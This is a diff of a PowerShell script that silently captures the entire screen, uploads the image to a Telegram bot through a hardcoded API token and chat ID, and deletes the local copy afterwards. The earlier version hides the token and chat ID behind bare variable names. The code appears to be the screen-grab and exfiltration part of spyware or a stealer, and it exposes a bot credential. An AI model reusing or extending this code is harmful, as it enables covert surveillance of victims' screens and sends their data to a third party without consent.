@@ -1,87 +1,54 @@
-# WORKING SCREENSHOT FUNCTION (Based on your Python script)
-
-# Configuration
-$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
-$y = "2146236602"
+# ================= CONFIG =================
+$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
+$ChatId   = "2146236602"
 
 function Capture-Screenshot {
-    Write-Host "📸 Capturing screenshot..." -ForegroundColor Yellow
-    
+
     try {
-        # Take screenshot using .NET (same as ImageGrab.grab() in Python)
+        Write-Host "📸 Capturing screenshot..." -ForegroundColor Yellow
+
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
-        
-        # Capture entire screen
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
-        
-        # Save to temp file
-        $screenshotPath = "$env:TEMP\Screenshot.jpg"
-        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $graphics.Dispose()
+
+        $screen  = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap  = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+
+        $graphic.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
+
+        $path = "$env:TEMP\Screenshot.jpg"
+        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+
+        $graphic.Dispose()
         $bitmap.Dispose()
-        
-        Write-Host "✅ Screenshot saved: $screenshotPath" -ForegroundColor Green
-        
-        # Send to Telegram (using the SAME method as your Python script)
+
+        Write-Host "✅ Screenshot saved: $path" -ForegroundColor Green
         Write-Host "📤 Sending to Telegram..." -ForegroundColor Yellow
-        
-        # Your Python script sends as photo, so we need to use sendPhoto endpoint
-        # The Python telebot library handles multipart form data automatically
-        # In PowerShell, we need to create it manually
-        
-        # Create boundary
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $CRLF = "`r`n"
-        
-        # Read file bytes
-        $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-        $fileContent = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-        
-        # Build multipart form data for sendPhoto (NOT sendDocument)
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"",
-            "",
-            "$y",
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"photo`"; filename=`"Screenshot.jpg`"",
-            "Content-Type: image/jpeg",
-            "",
-            $fileContent,
-            "--$boundary--"
-        ) -join $CRLF
-        
-        # Telegram API endpoint for sending photos
-        $uri = "https://api.telegram.org/bot$x/sendPhoto"
-        
-        # Send the request
-        $response = Invoke-RestMethod -Uri $uri -Method Post `
-            -ContentType "multipart/form-data; boundary=$boundary" `
-            -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
-        
+
+        $uri = "https://api.telegram.org/bot$BotToken/sendPhoto"
+
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Form @{
+            chat_id = $ChatId
+            photo   = Get-Item $path
+        }
+
         if ($response.ok) {
-            Write-Host "✅ Screenshot sent successfully to Telegram!" -ForegroundColor Green
-            # Cleanup
-            Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
-            Write-Host "🗑️ Temporary file cleaned up" -ForegroundColor Gray
+            Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
+            Remove-Item $path -Force -ErrorAction SilentlyContinue
             return $true
         } else {
-            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
+            Write-Host "❌ Telegram error: $($response.description)" -ForegroundColor Red
             return $false
         }
-        
+
     } catch {
         Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
 
-# Test it
+# Test
 Clear-Host
-Write-Host "Screenshot Test (Python method)" -ForegroundColor Cyan
+Write-Host "Screenshot Test (Robust Method)" -ForegroundColor Cyan
 Write-Host "===============================" -ForegroundColor Cyan
 Capture-Screenshot
